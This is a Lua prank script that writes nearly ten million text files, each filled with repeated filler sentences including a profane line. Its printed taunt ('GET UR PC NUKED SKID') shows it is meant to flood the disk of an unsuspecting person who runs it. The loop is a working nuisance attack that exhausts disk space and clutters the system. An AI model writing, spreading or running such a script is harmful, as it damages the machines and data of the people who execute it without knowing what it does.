function textfilecontents()
    local subjects = {"In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about ", "In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about In english the subject is what the sentence is talking about "}
    local verbs = {"In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action ", "In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action In english the verb is a word that conveys an action "}
    local objects = {"The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? ", "The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? The fuck is an object? "}

    local subject = subjects[math.random(#subjects)]
    local verb = verbs[math.random(#verbs)]
    local object = objects[math.random(#objects)]

    return subject .. " " .. verb .. " " .. object
end

-- Generate and write 5 random sentences to a file
function create_random_text_file(filename)
    math.randomseed(os.time()) -- just to annoy ppl XDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD

    local file = io.open(filename, "w")
    if file then
        for i = 1, 5 do
            local sentence = textfilecontents()
            file:write(sentence .. "\n")
        end
        file:close()
        print("LUL GET UR PC NUKED SKID HAHAHAHAHA")
    else
        print("File didnt open nooo")
    end
end

local numFiles = 9999999 -- amount of files made more = better

for i = 1, numFiles do
    local filename = "random_sentences_" .. i .. ".txt"
    create_random_text_file(filename)
end
